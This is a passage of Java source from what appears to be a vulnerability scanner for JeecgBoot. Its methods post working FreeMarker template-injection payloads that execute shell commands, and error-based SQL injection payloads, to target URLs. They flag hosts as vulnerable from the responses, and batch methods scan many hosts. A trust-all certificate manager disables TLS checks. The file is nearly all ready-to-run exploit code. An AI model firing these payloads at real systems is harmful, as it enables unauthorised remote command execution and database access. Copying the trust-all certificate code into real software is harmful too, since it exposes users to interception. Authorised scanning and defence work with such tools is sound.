            NetworkUtils.configureSSL();
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            Random random = new Random();
            int randomNumber = random.nextInt(100);
            URL url1 = new URL(line + "/jeecg-boot/jmreport/loadTableData");
            String json = "{\"dbSource\":\"\",\"sql\":\"select '<#assign value=\\\"freemarker.template.utility.Execute\\\"?new()>${value(\\\"echo 888888\\\")}'\",\"tableName\":\"test_demo);\",\"pageNo\":1,\"pageSize\":10}";
            HttpURLConnection connection = (HttpURLConnection)url1.openConnection();
            connection.setRequestProperty(
                    "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36 Hutool"
            );
            connection.setDoOutput(true);
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Content-Type", "application/json");
            byte[] input = json.getBytes(StandardCharsets.UTF_8);
            OutputStream os = connection.getOutputStream();
            os.write(input, 0, input.length);
            os.flush();
            BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));
            StringBuffer response = new StringBuffer();
            response.append(br.readLine());

            String inputLine;
            while((inputLine = br.readLine()) != null) {
                response.append(inputLine);
            }

            if (response.toString().contains("888888")) {
                output.appendText(formattedDateTime + line + "[+++]存在JeecgBoot jmreport/loadTableData SSTI模板注入漏洞\n");
            }
        } catch (Exception e) {
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            output.appendText(formattedDateTime + line + "[-]不存在JeecgBoot jmreport/loadTableData SSTI模板注入漏洞-\n");
        }
    }

    public void jeecgsq(String line, TextArea output) {
        try {
            NetworkUtils.configureSSL();
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            Random random = new Random();
            int randomNumber = random.nextInt(100);
            URL url1 = new URL(line + "/jeecg-boot/jmreport/qurestSql");
            String json = "{\"apiSelectId\":\"1290104038414721025\",\"id\":\"1' or '%1%' like (updatexml(0x3a,concat(1,(select md5(123456))),1)) or '%%' like '\"}";
            HttpURLConnection connection = (HttpURLConnection)url1.openConnection();
            connection.setRequestProperty(
                    "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36 Hutool"
            );
            connection.setDoOutput(true);
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Content-Type", "application/json");
            byte[] input = json.getBytes(StandardCharsets.UTF_8);
            OutputStream os = connection.getOutputStream();
            os.write(input, 0, input.length);
            os.flush();
            BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));
            StringBuffer response = new StringBuffer();
            response.append(br.readLine());

            String inputLine;
            while((inputLine = br.readLine()) != null) {
                response.append(inputLine);
            }

            if (response.toString().contains("e10adc3949ba59abbe56e057f20f883e")) {
                output.appendText(formattedDateTime + line + "[+++]可能存在Jeecg-Boot qurestSql-SQL注入漏洞\n");
            }
        } catch (Exception e) {
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            output.appendText(formattedDateTime + line + "[-]不存在Jeecg-Boot qurestSql-SQL注入漏洞-\n");
        }
    }

    public void port(String line, TextArea output) {
        try {
            NetworkUtils.configureSSL();
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            Random random = new Random();
            int randomNumber = random.nextInt(100);
            URL url1 = new URL(line + "/jeecg-boot/jmreport/queryFieldBySql");
            String json = "{\"sql\":\"select '<#assign ex=\\\"freemarker.template.utility.Execute\\\"?new()> ${ ex(\\\"echo 86756755\\\") }' \"}";
            HttpURLConnection connection = (HttpURLConnection)url1.openConnection();
            connection.setRequestProperty(
                    "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36 Hutool"
            );
            connection.setDoOutput(true);
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Content-Type", "application/json");
            byte[] input = json.getBytes(StandardCharsets.UTF_8);
            OutputStream os = connection.getOutputStream();
            os.write(input, 0, input.length);
            os.flush();
            BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));
            StringBuffer response = new StringBuffer();
            response.append(br.readLine());

            String inputLine;
            while((inputLine = br.readLine()) != null) {
                response.append(inputLine);
            }

            if (response.toString().contains("86756755")) {
                output.appendText(formattedDateTime + line + "[+]可能存在jeect-boot queryFieldBySql远程命令执行漏洞\n");
            }
        } catch (Exception e) {
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            output.appendText(formattedDateTime + line + "[-]不存在jeect-boot queryFieldBySql远程命令执行漏洞-\n");
        }
    }

    public void psl(String line, TextArea output) {
        try {
            NetworkUtils.configureSSL();
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            Random random = new Random();
            int randomNumber = random.nextInt(100);
            URL url1 = new URL(line + "/jeecg-boot/jmreport/loadTableData");
            String json = "{\"dbSource\":\"\",\"sql\":\"select '<#assign value=\\\"freemarker.template.utility.Execute\\\"?new()>${value(\\\"echo 888888\\\")}'\",\"tableName\":\"test_demo);\",\"pageNo\":1,\"pageSize\":10}";
            HttpURLConnection connection = (HttpURLConnection)url1.openConnection();
            connection.setRequestProperty(
                    "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36 Hutool"
            );
            connection.setDoOutput(true);
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Content-Type", "application/json");
            byte[] input = json.getBytes(StandardCharsets.UTF_8);
            OutputStream os = connection.getOutputStream();
            os.write(input, 0, input.length);
            os.flush();
            BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));
            StringBuffer response = new StringBuffer();
            response.append(br.readLine());

            String inputLine;
            while((inputLine = br.readLine()) != null) {
                response.append(inputLine);
            }

            if (response.toString().contains("888888")) {
                output.appendText(formattedDateTime + line + "[+++]存在JeecgBoot jmreport/loadTableData SSTI模板注入漏洞\n");
            }
        } catch (Exception e) {
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            output.appendText(formattedDateTime + line + "[-]不存在JeecgBoot jmreport/loadTableData SSTI模板注入漏洞-\n");
        }
    }

    private boolean isValidUrl(String url) {
        String urlRegex = "^(http|https)://[^\\s]*$";
        return url.matches(urlRegex);
    }

    // Jeecg-Boot getTotalData注入漏洞检测
    public void jeecgsfddg(String url, TextArea output) {
        try {
            if (url.endsWith("/")) {
                url = url.substring(0, url.length() - 1);
            }

            NetworkUtils.configureSSL();
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);

            Random random = new Random();
            random.nextInt(100);

            // 测试第一个接口
            URL url1 = new URL(url + "/jeecg-boot/drag/onlDragDatasetHead/getTotalData");
            HttpURLConnection connection = (HttpURLConnection) url1.openConnection();
            connection.setDoOutput(true);
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Content-Type", "application/json");
            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");

            byte[] input = "{\"tableName\":\"sys_user\",\"compName\":\"test\",\"condition\":{\"filter\":{}},\"config\":{\"assistValue\":[],\"assistType\":[],\"name\":[{\"fieldName\":\"concat(md5(123456))\",\"fieldType\":\"string\"},{\"fieldName\":\"id\",\"fieldType\":\"string\"}],\"value\":[{\"fieldName\":\"id\",\"fieldType\":\"1\"}],\"type\":[]}}".getBytes(StandardCharsets.UTF_8);
            OutputStream os = connection.getOutputStream();
            os.write(input, 0, input.length);
            os.flush();
            os.close();

            BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));
            StringBuffer response = new StringBuffer();
            response.append(br.readLine());
            while (true) {
                String inputLine = br.readLine();
                if (inputLine == null) {
                    break;
                }
                response.append(inputLine);
            }
            br.close();

            if (response.toString().contains("e10adc3949ba59abbe56e057f20f883e")) {
                output.appendText(formattedDateTime + " " + url + "/jeecg-boot/drag/onlDragDatasetHead/getTotalData [+]存在Jeecg-Boot getTotalData注入漏洞\n");
            } else {
                output.appendText(formattedDateTime + " " + url + "/jeecg-boot/drag/onlDragDatasetHead/getTotalData [-]不存在Jeecg-Boot getTotalData注入漏洞\n");
            }

            // 测试第二个接口
            URL url2 = new URL(url + "/drag/onlDragDatasetHead/getTotalData");
            HttpURLConnection connection2 = (HttpURLConnection) url2.openConnection();
            connection2.setDoOutput(true);
            connection2.setRequestMethod("POST");
            connection2.setRequestProperty("Content-Type", "application/json");
            connection2.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");

            OutputStream os2 = connection2.getOutputStream();
            os2.write(input, 0, input.length);
            os2.flush();
            os2.close();

            BufferedReader br2 = new BufferedReader(new InputStreamReader(connection2.getInputStream()));
            StringBuffer response2 = new StringBuffer();
            response2.append(br2.readLine());
            while (true) {
                String inputLine = br2.readLine();
                if (inputLine == null) {
                    break;
                }
                response2.append(inputLine);
            }
            br2.close();

            if (response2.toString().contains("e10adc3949ba59abbe56e057f20f883e")) {
                output.appendText(formattedDateTime + " " + url + "/drag/onlDragDatasetHead/getTotalData [+]存在Jeecg-Boot getTotalData注入漏洞\n");
            } else {
                output.appendText(formattedDateTime + " " + url + "/drag/onlDragDatasetHead/getTotalData [-]不存在Jeecg-Boot getTotalData注入漏洞\n");
            }

        } catch (Exception e) {
            LocalDateTime now2 = LocalDateTime.now();
            DateTimeFormatter formatter2 = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            output.appendText(now2.format(formatter2) + " " + url + " [-]不存在Jeecg-Boot getTotalData注入漏洞\n");
        }
    }

    // 批量检查getTotalData注入漏洞
    public void jeecgtotal(String url, TextArea output) {
        try {
            if (url.endsWith("/")) {
                url = url.substring(0, url.length() - 1);
            }

            NetworkUtils.configureSSL();
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);

            // 测试第一个接口
            URL url1 = new URL(url + "/jeecg-boot/drag/onlDragDatasetHead/getTotalData");
            HttpURLConnection connection = (HttpURLConnection) url1.openConnection();
            connection.setDoOutput(true);
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Content-Type", "application/json");
            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");

            byte[] input = "{\"tableName\":\"sys_user\",\"compName\":\"test\",\"condition\":{\"filter\":{}},\"config\":{\"assistValue\":[],\"assistType\":[],\"name\":[{\"fieldName\":\"concat(md5(123456))\",\"fieldType\":\"string\"},{\"fieldName\":\"id\",\"fieldType\":\"string\"}],\"value\":[{\"fieldName\":\"id\",\"fieldType\":\"1\"}],\"type\":[]}}".getBytes(StandardCharsets.UTF_8);
            OutputStream os = connection.getOutputStream();
            os.write(input, 0, input.length);
            os.flush();
            os.close();

            BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));
            StringBuffer response = new StringBuffer();
            response.append(br.readLine());
            while (true) {
                String inputLine = br.readLine();
                if (inputLine == null) {
                    break;
                }
                response.append(inputLine);
            }
            br.close();

            if (response.toString().contains("e10adc3949ba59abbe56e057f20f883e")) {
                output.appendText(formattedDateTime + " " + url + "/jeecg-boot/drag/onlDragDatasetHead/getTotalData [+]存在Jeecg-Boot getTotalData注入漏洞\n");
            }

            // 测试第二个接口
            URL url2 = new URL(url + "/drag/onlDragDatasetHead/getTotalData");
            HttpURLConnection connection2 = (HttpURLConnection) url2.openConnection();
            connection2.setDoOutput(true);
            connection2.setRequestMethod("POST");
            connection2.setRequestProperty("Content-Type", "application/json");
            connection2.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");

            OutputStream os2 = connection2.getOutputStream();
            os2.write(input, 0, input.length);
            os2.flush();
            os2.close();

            BufferedReader br2 = new BufferedReader(new InputStreamReader(connection2.getInputStream()));
            StringBuffer response2 = new StringBuffer();
            response2.append(br2.readLine());
            while (true) {
                String inputLine = br2.readLine();
                if (inputLine == null) {
                    break;
                }
                response2.append(inputLine);
            }
            br2.close();

            if (response2.toString().contains("e10adc3949ba59abbe56e057f20f883e")) {
                output.appendText(formattedDateTime + " " + url + "/drag/onlDragDatasetHead/getTotalData [+]存在Jeecg-Boot getTotalData注入漏洞\n");
            }

        } catch (Exception e) {
            // 批量检查时静默处理异常
        }
    }

    // Jeecg-Boot jmreport/show SQL注入漏洞检测
    public void jeecgshow(String url, TextArea output) {
        try {
            if (url.endsWith("/")) {
                url = url.substring(0, url.length() - 1);
            }

            NetworkUtils.configureSSL();
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);

            // 测试第一个接口
            URL url1 = new URL(url + "/jeecg-boot/jmreport/show");
            HttpURLConnection connection = (HttpURLConnection) url1.openConnection();
            connection.setDoOutput(true);
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Content-Type", "application/json;charset=UTF-8");
            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1866.237 Safari/537.36");
            connection.setRequestProperty("Accept-Encoding", "gzip");

            String jsonPayload = "{\"id\":\"961455b47c0b86dc961e90b5893bff05\",\"apiUrl\":\"\",\"params\":{\"id \":\"1 ' or ' % 1 % ' like (updatexml(0x3a,concat(1,(version())),1)) or ' % % ' like '\"}}";
            byte[] input = jsonPayload.getBytes(StandardCharsets.UTF_8);
            OutputStream os = connection.getOutputStream();
            os.write(input, 0, input.length);
            os.flush();
            os.close();

            BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));
            StringBuffer response = new StringBuffer();
            response.append(br.readLine());
            while (true) {
                String inputLine = br.readLine();
                if (inputLine == null) {
                    break;
                }
                response.append(inputLine);
            }
            br.close();

            String responseStr = response.toString();
            if (responseStr.contains("XPATH syntax error") || responseStr.contains("MySQL") || responseStr.contains("MariaDB")) {
                output.appendText(formattedDateTime + " " + url + "/jeecg-boot/jmreport/show [+]存在Jeecg-Boot jmreport/show SQL注入漏洞\n");
            } else {
                output.appendText(formattedDateTime + " " + url + "/jeecg-boot/jmreport/show [-]不存在Jeecg-Boot jmreport/show SQL注入漏洞\n");
            }

            // 测试第二个接口
            URL url2 = new URL(url + "/jmreport/show");
            HttpURLConnection connection2 = (HttpURLConnection) url2.openConnection();
            connection2.setDoOutput(true);
            connection2.setRequestMethod("POST");
            connection2.setRequestProperty("Content-Type", "application/json;charset=UTF-8");
            connection2.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1866.237 Safari/537.36");
            connection2.setRequestProperty("Accept-Encoding", "gzip");

            OutputStream os2 = connection2.getOutputStream();
            os2.write(input, 0, input.length);
            os2.flush();
            os2.close();

            BufferedReader br2 = new BufferedReader(new InputStreamReader(connection2.getInputStream()));
            StringBuffer response2 = new StringBuffer();
            response2.append(br2.readLine());
            while (true) {
                String inputLine = br2.readLine();
                if (inputLine == null) {
                    break;
                }
                response2.append(inputLine);
            }
            br2.close();

            String responseStr2 = response2.toString();
            if (responseStr2.contains("XPATH syntax error") || responseStr2.contains("MySQL") || responseStr2.contains("MariaDB")) {
                output.appendText(formattedDateTime + " " + url + "/jmreport/show [+]存在Jeecg-Boot jmreport/show SQL注入漏洞\n");
            } else {
                output.appendText(formattedDateTime + " " + url + "/jmreport/show [-]不存在Jeecg-Boot jmreport/show SQL注入漏洞\n");
            }

        } catch (Exception e) {
            LocalDateTime now2 = LocalDateTime.now();
            DateTimeFormatter formatter2 = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            output.appendText(now2.format(formatter2) + " " + url + " [-]不存在Jeecg-Boot jmreport/show SQL注入漏洞\n");
        }
    }

    // 批量检查jmreport/show SQL注入漏洞
    public void jeecgshowbatch(String url, TextArea output) {
        try {
            if (url.endsWith("/")) {
                url = url.substring(0, url.length() - 1);
            }

            NetworkUtils.configureSSL();
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);

            // 测试第一个接口
            URL url1 = new URL(url + "/jeecg-boot/jmreport/show");
            HttpURLConnection connection = (HttpURLConnection) url1.openConnection();
            connection.setDoOutput(true);
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Content-Type", "application/json;charset=UTF-8");
            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1866.237 Safari/537.36");
            connection.setRequestProperty("Accept-Encoding", "gzip");

            String jsonPayload = "{\"id\":\"961455b47c0b86dc961e90b5893bff05\",\"apiUrl\":\"\",\"params\":{\"id \":\"1 ' or ' % 1 % ' like (updatexml(0x3a,concat(1,(version())),1)) or ' % % ' like '\"}}";
            byte[] input = jsonPayload.getBytes(StandardCharsets.UTF_8);
            OutputStream os = connection.getOutputStream();
            os.write(input, 0, input.length);
            os.flush();
            os.close();

            BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));
            StringBuffer response = new StringBuffer();
            response.append(br.readLine());
            while (true) {
                String inputLine = br.readLine();
                if (inputLine == null) {
                    break;
                }
                response.append(inputLine);
            }
            br.close();

            String responseStr = response.toString();
            if (responseStr.contains("XPATH syntax error") || responseStr.contains("MySQL") || responseStr.contains("MariaDB")) {
                output.appendText(formattedDateTime + " " + url + "/jeecg-boot/jmreport/show [+]存在Jeecg-Boot jmreport/show SQL注入漏洞\n");
            }

            // 测试第二个接口
            URL url2 = new URL(url + "/jmreport/show");
            HttpURLConnection connection2 = (HttpURLConnection) url2.openConnection();
            connection2.setDoOutput(true);
            connection2.setRequestMethod("POST");
            connection2.setRequestProperty("Content-Type", "application/json;charset=UTF-8");
            connection2.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1866.237 Safari/537.36");
            connection2.setRequestProperty("Accept-Encoding", "gzip");

            OutputStream os2 = connection2.getOutputStream();
            os2.write(input, 0, input.length);
            os2.flush();
            os2.close();

            BufferedReader br2 = new BufferedReader(new InputStreamReader(connection2.getInputStream()));
            StringBuffer response2 = new StringBuffer();
            response2.append(br2.readLine());
            while (true) {
                String inputLine = br2.readLine();
                if (inputLine == null) {
                    break;
                }
                response2.append(inputLine);
            }
            br2.close();

            String responseStr2 = response2.toString();
            if (responseStr2.contains("XPATH syntax error") || responseStr2.contains("MySQL") || responseStr2.contains("MariaDB")) {
                output.appendText(formattedDateTime + " " + url + "/jmreport/show [+]存在Jeecg-Boot jmreport/show SQL注入漏洞\n");
            }

        } catch (Exception e) {
            // 批量检查时静默处理异常
        }
    }

    // TrustAllTrustManager for SSL bypass
    public static class TrustAllTrustManager implements javax.net.ssl.X509TrustManager {
        public java.security.cert.X509Certificate[] getAcceptedIssuers() {
            return null;
        }
        public void checkClientTrusted(java.security.cert.X509Certificate[] certs, String authType) {
        }
        public void checkServerTrusted(java.security.cert.X509Certificate[] certs, String authType) {
        }
    }

}
